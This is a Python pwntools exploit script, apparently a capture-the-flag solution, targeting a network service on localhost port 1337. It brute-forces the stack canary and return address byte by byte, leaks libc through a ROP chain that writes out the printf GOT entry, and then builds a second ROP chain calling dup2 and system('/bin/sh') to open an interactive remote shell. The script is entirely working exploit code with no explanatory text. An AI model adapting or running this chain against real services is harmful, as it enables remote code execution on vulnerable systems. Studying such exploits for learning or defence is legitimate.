#!/usr/bin/env python
 
from pwn import *
 
import time
 
context.log_level = 21 # disable connection log
 
rhost = '127.0.0.1'
rport = 1337
 
brute_str = '\x00'
expl  = 'A' * 56
 
while (len(brute_str) < 24):
  for i in range(256):
    fail = False
    io = remote(rhost, rport)
    io.send(expl+brute_str+chr(i))
    try:
      r = io.recvuntil('Done.\n', timeout=1.0)
      if (len(r) == 0): fail = True # timeout
    except: fail = True # EOF
    io.close()
    if (fail):
      if (i == 255):
        print('bruteforcing failed')
        quit()
      continue
    print('found byte: ' + hex(i))
    brute_str += chr(i)
    io.close()
    break
 
u = make_unpacker(64, endian='little', sign='unsigned')
canary   = u(brute_str[:8])
rbp      = u(brute_str[8:16])
ret_addr = u(brute_str[16:])
 
print('canary  : ' + hex(canary))
print('rbp     : ' + hex(rbp))
print('ret_addr: ' + hex(ret_addr))
 
img_base = ret_addr - 0x1562
print('img_base: ' + hex(img_base))
 
pop_rdi     = 0x164b
pop_rsi_r15 = 0x1649
pop_rdx     = 0x1265
write       = 0x154e
printf_got  = 0x4058
printf_offset = 0x64e80
 
# leak libc address
 
expl  = 'A' * 56
expl += p64(canary)
expl += p64(rbp)
expl += p64(img_base+pop_rdx)
expl += p64(8)
expl += p64(img_base+pop_rsi_r15)
expl += p64(img_base+printf_got)
expl += p64(0)
expl += p64(img_base+write)
io = remote(rhost, rport)
io.send(expl)
io.recvuntil('admin:\n')
leak = u(io.recv(8))
print('leak     :' + hex(leak))
libc_base = leak - printf_offset
print('libc_base:' + hex(libc_base))
io.close()
 
# exploit
 
dup2_offset = 0x1109a0
execve_offset = 0xe4e30
system_offset = 0x4f440
binsh_offset = 0x1b3e9a
 
expl  = 'A' * 56
expl += p64(canary)
expl += p64(rbp)
 
# dup2(socket_fd, 0)
expl += p64(img_base+pop_rsi_r15)
expl += p64(0)*2
expl += p64(libc_base+dup2_offset)
 
# dup2(socket_fd, 1)
expl += p64(img_base+pop_rsi_r15)
expl += p64(1)+p64(0)
expl += p64(libc_base+dup2_offset)
 
# system("/bin/sh")
expl += p64(img_base+pop_rsi_r15)
expl += p64(0)*2
expl += p64(img_base+pop_rdx)
expl += p64(0)
expl += p64(img_base+pop_rdi)
expl += p64(libc_base+binsh_offset)
expl += p64(libc_base+system_offset)
 
io = remote(rhost, rport)
io.send(expl)
io.interactive()
